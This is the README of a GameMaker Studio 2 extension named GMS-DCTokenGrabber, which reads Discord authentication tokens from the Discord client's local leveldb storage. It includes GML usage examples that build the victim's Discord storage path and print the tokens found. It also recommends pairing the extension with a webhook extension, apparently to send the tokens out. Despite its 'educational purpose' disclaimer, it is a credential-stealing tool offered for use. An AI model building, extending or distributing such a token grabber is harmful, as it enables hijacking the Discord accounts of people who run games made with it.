# GMS-DCTokenGrabber
****

Simple extension for *[GameMaker Studio 2](https://www.yoyogames.com/gamemaker/features)* to get Discord tokens from given path. 

Made only for educational purpose!
Be aware that author of this extension is **NOT** responisble for your actions!
Using it in harmful way is against [Discord](https://discord.com/terms) and [YoYo](https://www.yoyogames.com/legal/eula) ToS, as well as for some of the local laws!

## Installation
****

Go to Releases, download one of two packages and drag them onto your GMS2 project window.
Click [here](https://docs2.yoyogames.com/source/_build/2_interface/2_extras/local_asset_packages.html) if you need better clarification.

## Usage
****
Both versions (Extension and Scripted) have function `DTG_get_tokens()` / `DTG_get_tokens_exd()` which works in the same way. 

Both accept only one ***string*** argument which is a path to a directory with `.ldb` files.
The return value is a ***string*** of Discord tokens separated by a new line symbol `\n` or an error message starting with `Error:` and then explanation what have failed.

If the return value is an empty string, it means that no tokens were found.

## Version explanation
****
**Extension -** Made by creating GMS extension. Supposedly more efficient and error friendly.
**Scripted -** Made only by using scripts and functions. Allows changng DLL name or path and require init function.

## Examples
****
The same thing can be found in Demo object.

**Extention version:**
```gml
var _path = "C:/Users/"+environment_get_variable("USERNAME")+"/AppData/Roaming/discord/Local Storage/leveldb/";

tokens = DTG_get_tokens(_path);

show_debug_message(tokens);
```

**Scripted version:**
```gml
var _path = "C:/Users/"+environment_get_variable("USERNAME")+"/AppData/Roaming/discord/Local Storage/leveldb/";

DTG_init("bin/Grabber.dll");
tokens = DTG_get_tokens_exd(_path);

show_debug_message(tokens);
```

## Notes
****
GMS project doesn't requie sandboxed file system to be turned off.
I recomend using my [webhook extension](https://github.com/DmitrijVC/DiscordWebhook-GMS2.3Beta) along with this one.